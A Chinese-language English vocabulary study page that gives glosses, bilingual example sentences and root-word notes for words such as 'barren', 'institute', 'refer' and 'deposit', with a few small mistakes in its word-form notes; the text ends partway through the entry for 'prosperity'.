<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 10076 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 35 分钟</p>
</div>
<h2 id="note-language-english-part-1">PART 1<a class="headerlink" href="#note-language-english-part-1" title="Permanent link">&para;</a></h2>
<p><span style="color: red;">barren</span></p>
<ul>
<li>adj. <ul>
<li>贫瘠的,不毛的，不孕不育的</li>
<li>没有效果的</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The barren land was a source of great frustration.</p>
<p>这片贫瘠的土地让我感到非常沮丧。</p>
</div>
<p><span style="color: red;">spot</span></p>
<ul>
<li>n.<ul>
<li>斑点,污渍,脏点</li>
<li>粉刺，脓包</li>
<li>地点，场所</li>
<li>机会，时机</li>
<li>一点，一点儿</li>
</ul>
</li>
<li>v.<ul>
<li>看见,注意到,发现</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>There was a spot on his face.</p>
<p>他脸上有一个脏点。</p>
</div>
<p><span style="color: red;">bleak</span></p>
<ul>
<li>adj.<ul>
<li>荒凉的, 阴冷的</li>
<li>没有希望的, 凄凉的</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The landscape was bleak and desolate.</p>
<p>景色荒凉而凄凉。</p>
</div>
<p><span style="color: red;">leak</span></p>
<ul>
<li>n.<ul>
<li>漏洞, 漏出, 泄漏</li>
<li>漏出物, 漏出量</li>
</ul>
</li>
<li>v.<ul>
<li>漏, 渗漏</li>
<li>泄露, 透露</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>There was a leak in the roof.</p>
<p>屋顶有个漏洞。</p>
<p>The company tried to prevent any leaks of confidential information.</p>
<p>公司试图防止任何机密信息的泄露。</p>
</div>
<p><span style="color: red;">humid</span></p>
<ul>
<li>adj.<ul>
<li>潮湿的, 湿润的</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The air was humid and sticky.</p>
<p>空气潮湿而粘稠。</p>
</div>
<p>hum当词根有泥土的意思.humble可以理解为贴近泥土,有谦卑的意思</p>
<p><span style="color: red;">regulate</span></p>
<ul>
<li>v.<ul>
<li>管理, 控制, 调节</li>
<li>使规则化, 使有秩序</li>
</ul>
</li>
</ul>
<p>其名词形式为regulation，指规则,法规，ragular为规则的,有规律的</p>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The government regulates the financial industry to prevent fraud.</p>
<p>政府管理金融行业以防止欺诈。</p>
<p>The thermostat regulates the temperature in the house.</p>
<p>恒温器调节房子的温度。</p>
</div>
<p><span style="color: red;">summit</span></p>
<ul>
<li>n.<ul>
<li>顶点, 最高点</li>
<li>峰会, 最高级会议</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>They reached the summit of the mountain after a grueling climb.</p>
<p>经过艰苦的攀登，他们到达了山顶。</p>
<p>The leaders met at the summit to discuss global issues.</p>
<p>领导人在峰会上会面讨论全球问题。</p>
</div>
<p>mit当词根有send的意思,例如transmit为传递的意思,submit为提交的意思</p>
<p><span style="color: red;">defend</span></p>
<ul>
<li>v.<ul>
<li>防御, 保卫</li>
<li>为...辩护, 维护</li>
</ul>
</li>
</ul>
<p>其名词形式为defense，指防御, 防卫，defender为防御者, 辩护者</p>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The soldiers defended the castle from the invaders.</p>
<p>士兵们保卫城堡免受入侵者的攻击。</p>
<p>She defended her thesis during the oral examination.</p>
<p>她在口试中为她的论文辩护。</p>
</div>
<p>fend当词根有击打，推，撞击的意思,例如offend为冒犯</p>
<p><span style="color: red;">protest</span></p>
<ul>
<li>
<p>v.</p>
<ul>
<li>抗议, 反对</li>
<li>申明, 声明</li>
</ul>
</li>
<li>
<p>n.</p>
<ul>
<li>抗议, 反对</li>
</ul>
</li>
</ul>
<details class="idea">
<summary>Idea</summary>
<p>protest，提前考试，有意思哈，必须抗议！！！</p>
</details>
<p>其名词形式为protestation，指抗议, 声明，protester为抗议者, 反对者</p>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The workers protested against the unfair labor practices.</p>
<p>工人们抗议不公平的劳动惯例。</p>
<p>She protested her innocence during the trial.</p>
<p>她在审判期间申明她的清白。</p>
</div>
<p>detest 为憎恶，厌恶的意思，contest为争论，竞争的意思</p>
<p><span style="color: red;">sue</span></p>
<ul>
<li>v.<ul>
<li>控告, 起诉</li>
<li>请求, 恳求</li>
</ul>
</li>
</ul>
<p>其名词形式为suit，指诉讼，起诉，suitor为起诉者, 求婚者</p>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>She decided to sue the company for wrongful termination.</p>
<p>她决定起诉公司非法解雇。</p>
<p>He sued for peace after the long conflict.</p>
<p>在长期冲突后，他请求和平。</p>
</div>
<p>pursue 为追求，追赶的意思，ensue为接着发生的意思</p>
<p><span style="color: red;">versus</span></p>
<ul>
<li>prep.<ul>
<li>对抗, 与...相对</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The upcoming match is Team A versus Team B.</p>
<p>即将到来的比赛是A队对抗B队。</p>
<p>The court case was plaintiff versus defendant.</p>
<p>这场诉讼是原告对被告。</p>
</div>
<p>其缩写形式为vs.，常用于体育比赛和法律案件中。</p>
<p><span style="color: red;">compulsory</span></p>
<ul>
<li>adj.<ul>
<li>强制的, 必须做的</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>Education is compulsory for children in many countries.</p>
<p>在许多国家，教育是强制性的。</p>
<p>Wearing a seatbelt is compulsory in most vehicles.</p>
<p>在大多数车辆中，系安全带是强制性的。</p>
</div>
<p>其名词形式为compulsion，指强制，强迫，compulsorily为副词形式，表示强制地。</p>
<p><span style="color: red;">institute</span></p>
<ul>
<li>
<p>n.</p>
<ul>
<li>机构, 学院, 研究所</li>
<li>协会, 学会</li>
</ul>
</li>
<li>
<p>v.</p>
<ul>
<li>建立, 设立, 制定</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The institute offers various programs in science and technology.</p>
<p>该研究所提供各种科学和技术课程。</p>
<p>They decided to institute new policies to improve efficiency.</p>
<p>他们决定制定新政策以提高效率。</p>
</div>
<p>其名词形式为institution，指机构，制度，institutional为形容词形式，表示制度的，机构的。</p>
<p>in表示进入，词根时stitut时是sta(=stand)的变体，表示站立，建立的意思</p>
<p>MIT(Massachusetts Institute of Technology)麻省理工学院</p>
<p>substitute 为替代品(n)，代替(v)的意思(在下面站着)</p>
<p><span style="color: red;">proficient</span></p>
<ul>
<li>adj.<ul>
<li>熟练的, 精通的</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>She is proficient in several languages.</p>
<p>她精通几种语言。</p>
<p>He is a proficient programmer.</p>
<p>他是一名熟练的程序员。</p>
</div>
<p>其名词形式为proficiency，指熟练，精通，proficiently为副词形式，表示熟练地，精通地。</p>
<p>pro-表示向前，词根'ficient'表示有能力的，能够的意思,早就能够了，很熟练了</p>
<p>deficiency 为缺乏，不足，deficient为形容词形式，表示缺乏的，不足的</p>
<p>efficiency 为效率，efficient为形容词形式，表示效率高的，有效的</p>
<p>artificially 为人工的，artificial为形容词形式，表示人工的，人造的 </p>
<p><span style="color: red;">refer</span></p>
<ul>
<li>v.<ul>
<li>提到, 涉及</li>
<li>参考, 查阅</li>
<li>归因于</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>Please refer to the manual for more information.</p>
<p>请参考手册以获取更多信息。</p>
<p>He often refers to his notes during the lecture.</p>
<p>他在讲座期间经常参考他的笔记。</p>
<p>The term 'refer' can also mean to mention or allude to something.</p>
<p>'refer'这个词也可以表示提到或暗指某事。</p>
</div>
<p>其名词形式为reference，指参考，提及，referential为形容词形式，表示参考的，提及的。</p>
<p>re-表示回，词根'fer'表示带来，带回去，表示参考，提到的意思</p>
<p>reference book 参考书</p>
<p>infer 为推断，推论，inferred为推断的，推论的</p>
<p>prefer 为更喜欢，prefer为形容词形式，表示更喜欢的</p>
<p>transfer 为转移，转移，transferred为转移的，转移的</p>
<p><span style="color: red;">project</span></p>
<ul>
<li>n.<ul>
<li>项目, 计划</li>
<li>工程, 方案</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The team is working on a new project.</p>
<p>团队正在进行一个新项目。</p>
<p>She presented her project to the class.</p>
<p>她向班级展示了她的项目。</p>
<p>The term 'project' can also mean to plan or propose something.</p>
<p>'project'这个词也可以表示计划或提议某事。</p>
</div>
<p>其动词形式为project，指计划，设计，projected为形容词形式，表示计划的，设计的。</p>
<p>pro-表示向前，词根'ject'表示投掷，向前投掷，表示计划，设计的意思</p>
<p>projection 投影，预测</p>
<p>object 为物体，目标，objected为反对的，反对的</p>
<p>subject 为主题，科目，subjected为服从的，受制的</p>
<p>reject 为拒绝，拒绝，rejected为被拒绝的，被拒绝的</p>
<p><span style="color: red;">prior</span></p>
<ul>
<li>adj.<ul>
<li>先前的, 之前的</li>
<li>优先的, 更重要的</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>She had a prior engagement and couldn't attend the meeting.</p>
<p>她有一个先前的约会，不能参加会议。</p>
<p>The project was given prior approval.</p>
<p>该项目得到了事先批准。</p>
<p>The term 'prior' can also mean something that is more important or takes precedence.</p>
<p>'prior'这个词也可以表示更重要的或优先的事物。</p>
</div>
<p>其副词形式为priorly，指先前地，之前地。</p>
<p>pri-表示在前</p>
<p>priority 优先权，优先事项</p>
<p>prioritize 为优先考虑，优先处理</p>
<p>posterior 为后面的，较后的</p>
<p>superior 为更好的，上级的</p>
<p>inferior 为较差的，下级的</p>
<p><span style="color: red;">renovation</span></p>
<ul>
<li>n.<ul>
<li>翻新, 修复</li>
<li>革新, 改造</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The building is closed for renovation.</p>
<p>这栋建筑因翻新而关闭。</p>
<p>The company is undergoing a major renovation of its management structure.</p>
<p>该公司正在对其管理结构进行重大改造。</p>
<p>The term 'renovation' can also refer to the process of making something new again or restoring it to a better state.</p>
<p>'renovation'这个词也可以指使某物焕然一新或恢复到更好状态的过程。</p>
</div>
<p>其动词形式为renovate，指翻新，修复。</p>
<p>re-表示再次，nov-表示新的</p>
<p>innovate 创新，革新</p>
<p>innovation 创新，革新</p>
<p>novel 新颖的，新奇的</p>
<p>novelty 新奇，新颖</p>
<p><span style="color: red;">visualize</span></p>
<ul>
<li>v.<ul>
<li>使形象化, 使可视化</li>
<li>想象, 设想</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The architect used software to visualize the new building design.</p>
<p>建筑师使用软件来使新建筑设计可视化。</p>
<p>She tried to visualize the scene in her mind.</p>
<p>她试图在脑海中想象那个场景。</p>
<p>The term 'visualize' can also refer to the process of forming a mental image or making something visible.</p>
<p>'visualize'这个词也可以指形成心象或使某物可见的过程。</p>
</div>
<p>其名词形式为visualization，指可视化，形象化。</p>
<p>vis-表示看见</p>
<p>vision 视力，视觉</p>
<p>visible 可见的，看得见的</p>
<p>invisible 看不见的，隐形的</p>
<p>visual 视觉的，视力的</p>
<p>visualization 可视化，形象化</p>
<p>supervise 监督，监督，supervised为监督的，监督的 (在上面看)</p>
<p>previse 预见，预知，prevised为预见的，预知的(提前看)</p>
<p>revise 修订，修改(再看一遍)</p>
<p>television 电视，电视机，tele-表示远，电视把远的东西传过来</p>
<p><span style="color: red;">revive</span></p>
<ul>
<li>v.<ul>
<li>使复活, 使恢复</li>
<li>复苏, 重新流行(一般指经济)</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The doctor managed to revive the patient after the cardiac arrest.</p>
<p>医生在心脏骤停后设法使病人复活。</p>
<p>The old tradition is starting to revive in the community.</p>
<p>这个古老的传统在社区里开始重新流行。</p>
<p>The term 'revive' can also refer to bringing something back into use or popularity.</p>
<p>'revive'这个词也可以指使某物重新使用或流行。</p>
</div>
<p>其名词形式为revival，指复活，复兴。</p>
<p>re-表示再，重新</p>
<p>revive 使复活，使恢复</p>
<p>revival 复活，复兴</p>
<p>revivify 使复活，使恢复生气</p>
<p>survive 幸存，存活，survived为幸存的，存活的 (在下面活)</p>
<p>derive 源于，得自，derived为源于的，得自的(从...而来)</p>
<p>arrive 到达，抵达(到达某地)</p>
<p><span style="color: red;">script</span></p>
<ul>
<li>
<p>n.</p>
<ul>
<li>剧本, 脚本</li>
<li>剧本, 剧本</li>
</ul>
</li>
<li>
<p>v.</p>
<ul>
<li>写, 编写</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The term 'script' can also refer to a written text of a play, movie, or broadcast.</p>
<p>'script'这个词也可以指戏剧、电影或广播的书面文本。</p>
<p>Scripts are essential in the entertainment industry for planning and production.</p>
<p>剧本在娱乐行业中对于规划和制作是必不可少的。</p>
<p>The word 'script' can also refer to handwriting or a particular style of writing.</p>
<p>'script'这个词也可以指手写体或特定的书写风格。</p>
</div>
<p>describe 描述，形容</p>
<p>inscribe 铭刻，题词</p>
<p>subscribe 订阅，捐助</p>
<p>ascribe 归因于，归咎于(除了ab-表示否定，a-都表示一再)</p>
<p><span style="color: red;">default</span></p>
<ul>
<li>adj.<ul>
<li>默认的, 默认的</li>
<li>默认的, 默认的</li>
</ul>
</li>
<li>v.<ul>
<li>不履行, 不履行</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The default setting is to turn on the lights when the door is opened.</p>
<p>默认设置是当门打开时打开灯。</p>
<p>The default option is to save the file before closing.</p>
<p>默认选项是保存文件后再关闭。</p>
</div>
<p><span style="color: red;">deceive</span></p>
<ul>
<li>v.<ul>
<li>欺骗, 蒙骗</li>
<li>误导, 使误解</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>He tried to deceive his friends about his whereabouts.</p>
<p>他试图欺骗朋友关于他的行踪。</p>
<p>The magician's trick was designed to deceive the audience.</p>
<p>魔术师的把戏是为了欺骗观众。</p>
<p>The term 'deceive' can also mean to cause someone to believe something that is not true.</p>
<p>'deceive'这个词也可以表示使某人相信不真实的事情。</p>
</div>
<p>其名词形式为deception，指欺骗，蒙骗，deceptive为形容词形式，表示欺骗性的，误导的。</p>
<p>perceive 感知，察觉，perceived为感知的，察觉的</p>
<p>conceive 构思，设想，conceived为构思的，设想的</p>
<p>receive 接收，收到，received为接收的，收到的</p>
<p><span style="color: red;">detain</span></p>
<ul>
<li>v.<ul>
<li>拘留, 扣留</li>
<li>耽搁, 延误</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The police decided to detain the suspect for further questioning.</p>
<p>警方决定拘留嫌疑人以便进一步审问。</p>
<p>The unexpected traffic jam will detain us for an hour.</p>
<p>意外的交通堵塞会耽搁我们一个小时。</p>
<p>The term 'detain' can also mean to keep someone from proceeding or to hold back.</p>
<p>'detain'这个词也可以表示阻止某人前进或拖延。</p>
</div>
<p>其名词形式为detention，指拘留，扣留，detained为形容词形式，表示被拘留的，被扣留的。</p>
<p>maintain 维持，保持，maintained为维持的，保持的</p>
<p>entertain 娱乐，款待，entertainment 娱乐活动</p>
<p>sustain 维持，支持，sustain为维持的，支持的</p>
<p>retain 保持，保留，retained为保持的，保留的</p>
<p>obtain 获得，取得，obtained为获得的，取得的</p>
<p>attain 达到，获得</p>
<p><span style="color: red;">guilt</span></p>
<ul>
<li>n.<ul>
<li>罪行, 罪过</li>
<li>内疚, 自责</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The jury found him guilty of the crime.</p>
<p>陪审团认定他有罪。</p>
<p>She felt a deep sense of guilt after lying to her friend.</p>
<p>她在对朋友撒谎后感到深深的内疚。</p>
<p>The term 'guilt' can also refer to a feeling of responsibility or remorse for some offense, crime, or wrong.</p>
<p>'guilt'这个词也可以指对某些罪行、犯罪或错误的责任感或悔恨。</p>
</div>
<p>其形容词形式为guilty，表示有罪的，内疚的。</p>
<p>反义词innocent为无罪的</p>
<p><span style="color: red;">outrage</span></p>
<ul>
<li>
<p>n.</p>
<ul>
<li>愤怒, 义愤</li>
<li>暴行, 侮辱</li>
</ul>
</li>
<li>
<p>v.</p>
<ul>
<li>激怒, 使愤怒</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The news of the scandal caused public outrage.</p>
<p>丑闻的消息引起了公众的愤怒。</p>
<p>The brutal attack was an outrage against humanity.</p>
<p>这次残忍的袭击是对人类的暴行。</p>
<p>The term 'outrage' can also refer to an act that causes great anger or shock.</p>
<p>'outrage'这个词也可以指引起极大愤怒或震惊的行为。</p>
</div>
<p>其形容词形式为outraged，表示愤怒的，义愤填膺的。</p>
<p>反义词为calm，表示平静的。</p>
<p><span style="color: red;">rebel</span></p>
<ul>
<li>
<p>n.</p>
<ul>
<li>反叛者, 叛逆者</li>
<li>反抗者</li>
</ul>
</li>
<li>
<p>v.</p>
<ul>
<li>反叛, 造反</li>
<li>反抗, 抵抗</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The rebels took control of the capital.</p>
<p>反叛者控制了首都。</p>
<p>She rebelled against the strict rules imposed by her parents.</p>
<p>她反抗父母施加的严格规定。</p>
<p>The term 'rebel' can also refer to someone who resists authority, control, or tradition.</p>
<p>'rebel'这个词也可以指抵抗权威、控制或传统的人。</p>
</div>
<p>其形容词形式为rebellious，表示反叛的，叛逆的。</p>
<p><span style="color: red;">terror</span></p>
<ul>
<li>n.<ul>
<li>恐怖, 恐惧</li>
<li>恐怖活动, 恐怖主义</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The mere thought of the haunted house filled her with terror.</p>
<p>一想到鬼屋，她就充满了恐惧。</p>
<p>The city was in a state of terror after the series of attacks.</p>
<p>一系列袭击后，城市处于恐怖状态。</p>
<p>The term 'terror' can also refer to extreme fear or the use of violence to intimidate people.</p>
<p>'terror'这个词也可以指极度的恐惧或使用暴力来恐吓人们。</p>
</div>
<p><span style="color: red;">verdict</span></p>
<ul>
<li>n.<ul>
<li>裁决, 判决</li>
<li>定论, 结论</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The jury reached a unanimous verdict of 'not guilty'.</p>
<p>陪审团达成了一致的'无罪'裁决。</p>
<p>The judge's verdict was based on the evidence presented in court.</p>
<p>法官的判决是基于法庭上提供的证据。</p>
<p>The term 'verdict' can also refer to an opinion or judgment about something.</p>
<p>'verdict'这个词也可以指对某事的意见或判断。</p>
</div>
<p><span style="color: red;">blast</span></p>
<ul>
<li>
<p>n.</p>
<ul>
<li>爆炸, 爆破</li>
<li>一阵强风, 冲击波</li>
</ul>
</li>
<li>
<p>v.</p>
<ul>
<li>爆炸</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The blast from the explosion shattered all the windows in the building.</p>
<p>爆炸的冲击波震碎了大楼的所有窗户。</p>
<p>A cold blast of air hit her as she opened the door.</p>
<p>当她打开门时，一阵冷风袭来。</p>
<p>The term 'blast' can also refer to a loud noise or an enjoyable experience.</p>
<p>'blast'这个词也可以指巨响或一次愉快的经历。</p>
</div>
<p><span style="color: red;">emergency</span></p>
<ul>
<li>n.<ul>
<li>紧急情况, 突发事件</li>
<li>紧急状态</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The hospital is equipped to handle any kind of emergency.</p>
<p>医院配备了处理任何紧急情况的设备。</p>
<p>In case of an emergency, please call 911 immediately.</p>
<p>如果发生紧急情况，请立即拨打911。</p>
<p>The term 'emergency' can also refer to a situation that requires immediate action or attention.</p>
<p>'emergency'这个词也可以指需要立即采取行动或注意的情况。</p>
</div>
<p>其形容词形式为emergent，表示紧急的，突发的。</p>
<p>emerge 出现，浮现，emerged为出现的，浮现的</p>
<p>urgent 紧急的，急迫的</p>
<p>urgency 紧急，急迫</p>
<p><span style="color: red;">misfortune</span></p>
<ul>
<li>n.<ul>
<li>不幸, 灾难</li>
<li>厄运, 倒霉</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>He had the misfortune of losing his job during the economic downturn.</p>
<p>他在经济衰退期间失去了工作，真是不幸。</p>
<p>The family's misfortune seemed to never end.</p>
<p>这个家庭的不幸似乎永无止境。</p>
<p>The term 'misfortune' can also refer to an event or circumstance that brings bad luck or adversity.</p>
<p>'misfortune'这个词也可以指带来厄运或逆境的事件或情况。</p>
</div>
<p>其形容词形式为unfortunate，表示不幸的，倒霉的。</p>
<p>fortune 运气，财富，fortunate为幸运的，幸运的</p>
<p>mis-表示错误，坏的</p>
<p>misadventure 意外事故，不幸遭遇</p>
<p>mishap 小事故，不幸事件</p>
<p><span style="color: red;">urgent</span></p>
<ul>
<li>adj.<ul>
<li>紧急的, 急迫的</li>
<li>迫切的, 紧要的</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The situation requires urgent attention.</p>
<p>这种情况需要紧急关注。</p>
<p>She sent an urgent message to her team.</p>
<p>她给她的团队发了一条紧急消息。</p>
<p>The term 'urgent' can also refer to something that needs immediate action or attention.</p>
<p>'urgent'这个词也可以指需要立即行动或关注的事情。</p>
</div>
<p>其名词形式为urgency，指紧急，急迫。</p>
<p>urge 催促，推动，urged为催促的，推动的</p>
<p>emergency 紧急情况，紧急事件</p>
<p>pressing 紧迫的，迫切的</p>
<p>immediate 立即的，直接的</p>
<p><span style="color: red;">bankrupt</span></p>
<ul>
<li>
<p>adj.</p>
<ul>
<li>破产的, 无力偿还债务的</li>
<li>完全缺乏的, 贫困的</li>
</ul>
</li>
<li>
<p>n.</p>
<ul>
<li>破产者, 无力偿还债务者</li>
</ul>
</li>
<li>
<p>v.</p>
<ul>
<li>使破产, 使无力偿还债务</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The company went bankrupt after years of financial struggles.</p>
<p>该公司在多年财务困难后破产了。</p>
<p>He was declared bankrupt by the court.</p>
<p>他被法院宣布破产。</p>
<p>The term 'bankrupt' can also refer to a person or entity that is completely lacking in a particular quality or value.</p>
<p>'bankrupt'这个词也可以指完全缺乏某种特质或价值的人或实体。</p>
</div>
<p>其名词形式为bankruptcy，指破产，倒闭。</p>
<p>bank 作为词根表示银行，财务</p>
<p>rupt 表示破裂，断裂</p>
<p>disrupt 破坏，扰乱</p>
<p>interrupt 打断，中断</p>
<p>corrupt 腐败的，堕落的</p>
<p><span style="color: red;">deposit</span></p>
<ul>
<li>
<p>n.</p>
<ul>
<li>存款, 定金</li>
<li>沉积物, 矿床</li>
</ul>
</li>
<li>
<p>v.</p>
<ul>
<li>存放, 存储</li>
<li>沉积, 堆积</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>She made a deposit of $500 into her savings account.</p>
<p>她在她的储蓄账户中存入了500美元。</p>
<p>The river deposits silt along its banks.</p>
<p>这条河在河岸上沉积淤泥。</p>
<p>The term 'deposit' can also refer to a layer of material that has been laid down naturally.</p>
<p>'deposit'这个词也可以指自然沉积的一层物质。</p>
</div>
<p>其名词形式为deposition，指沉积，沉积物。</p>
<p>de 表示向下，离开</p>
<p>posit 表示放置</p>
<p>decompose 分解，腐烂</p>
<p>dispose 处理，处置</p>
<p>expose 暴露，揭露(be exposed to 暴露于,接触到)</p>
<p>propose 求婚，建议</p>
<p>compose 组成，构成</p>
<p>impose 强加，征税</p>
<p><span style="color: red;">guarantee</span></p>
<ul>
<li>
<p>n.</p>
<ul>
<li>保证, 担保</li>
<li>保修单, 保证书</li>
</ul>
</li>
<li>
<p>v.</p>
<ul>
<li>保证, 担保</li>
<li>确保, 使...必然发生</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The company offers a money-back guarantee if the product doesn't work.</p>
<p>如果产品不起作用，公司提供退款保证。</p>
<p>I guarantee that you will be satisfied with the results.</p>
<p>我保证你会对结果满意。</p>
<p>The warranty guarantees the product against defects for one year.</p>
<p>保修单保证产品一年内无缺陷。</p>
</div>
<p>其名词形式为guarantor，指担保人。</p>
<p>guar 表示保护，保卫</p>
<p>antee 表示行动或状态</p>
<p>guard 守卫，保卫</p>
<p>warranty 保修，保证</p>
<p>assure 确保，保证</p>
<p>ensure 确保，保证</p>
<p>secure 安全的，确保</p>
<p><span style="color: red;">fund</span></p>
<ul>
<li>
<p>n.</p>
<ul>
<li>资金, 基金</li>
<li>专款, 现款</li>
</ul>
</li>
<li>
<p>v.</p>
<ul>
<li>提供资金, 资助</li>
<li>投资, 资助</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The government allocated funds for the new infrastructure project.</p>
<p>政府为新的基础设施项目拨款。</p>
<p>She decided to fund the startup with her savings.</p>
<p>她决定用她的积蓄资助这家初创公司。</p>
<p>The term 'fund' can also refer to a sum of money saved or made available for a particular purpose.</p>
<p>'fund'这个词也可以指为特定目的储存或提供的一笔资金。</p>
</div>
<p>其名词形式为funding，指资金，资助。</p>
<p>fundamental 基本的，基础的</p>
<p>refund 退款，退还</p>
<p>defund 撤资，停止资助</p>
<p>fundraiser 募捐活动，筹款人</p>
<p><span style="color: red;">export</span></p>
<ul>
<li>v.<ul>
<li>出口, 输出</li>
<li>传播, 输出</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The country exports a large amount of oil.</p>
<p>这个国家出口大量石油。</p>
<p>The software allows users to export data to various formats.</p>
<p>该软件允许用户将数据导出为各种格式。</p>
<p>The term 'export' can also refer to the act of sending goods or services to another country for sale.</p>
<p>'export'这个词也可以指将商品或服务发送到另一个国家进行销售的行为。</p>
</div>
<p>其名词形式为exportation，指出口，输出，exporter为名词形式，表示出口商。</p>
<p>ex-表示向外，port表示港口，向外运到港口，表示出口的意思</p>
<p>import 进口，输入</p>
<p>transport 运输，运送</p>
<p>support 支持，支撑</p>
<p>report 报告，汇报</p>
<p><span style="color: red;">manufacturer</span></p>
<ul>
<li>n.<ul>
<li>制造商, 生产者</li>
<li>厂商, 制造公司</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The manufacturer produces high-quality electronics.</p>
<p>该制造商生产高质量的电子产品。</p>
<p>The term 'manufacturer' can also refer to a company or person that makes goods for sale.</p>
<p>'manufacturer'这个词也可以指制造商品以供销售的公司或个人。</p>
</div>
<p><span style="color: red;">mortgage</span></p>
<ul>
<li>n.<ul>
<li>抵押贷款, 按揭</li>
<li>抵押</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>They took out a mortgage to buy their house.</p>
<p>他们办理了抵押贷款来买房。</p>
<p>The term 'mortgage' can also refer to the legal agreement by which a bank lends money in exchange for taking title of the debtor's property.</p>
<p>'mortgage'这个词也可以指银行通过借款协议获得债务人财产所有权的法律协议。</p>
</div>
<p><span style="color: red;">pension</span></p>
<ul>
<li>n.<ul>
<li>养老金, 退休金</li>
<li>抚恤金</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>She lives on her pension after retiring from the company.</p>
<p>她退休后靠养老金生活。</p>
<p>The term 'pension' can also refer to a regular payment made during a person's retirement from an investment fund to which that person or their employer has contributed during their working life.</p>
<p>'pension'这个词也可以指在一个人工作期间由其本人或雇主缴纳的投资基金在其退休期间定期支付的款项。</p>
</div>
<p><span style="color: red;">profit</span></p>
<ul>
<li>n.<ul>
<li>利润, 收益</li>
<li>利润率</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The company made a significant profit last year.</p>
<p>该公司去年获得了可观的利润。</p>
<p>The term 'profit' can also refer to the financial gain, especially the difference between the amount earned and the amount spent in buying, operating, or producing something.</p>
<p>'profit'这个词也可以指财务收益，特别是收入与购买、运营或生产某物的支出之间的差额。</p>
</div>
<p>benefit 利益，好处</p>
<p><span style="color: red;">prosperity</span></p>
<ul>
<li>n.<ul>
<li>繁荣, 兴旺</li>
<li>成功, 昌盛</li>
</ul>
</li>
</ul>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>The country enjoyed a period of prosperity after the war.</p>
<p>战后该国经历了一段繁荣时期。</p>
<p>The term 'prosperity' can also refer to the state of being successful, especially in financial or economic terms.</p>
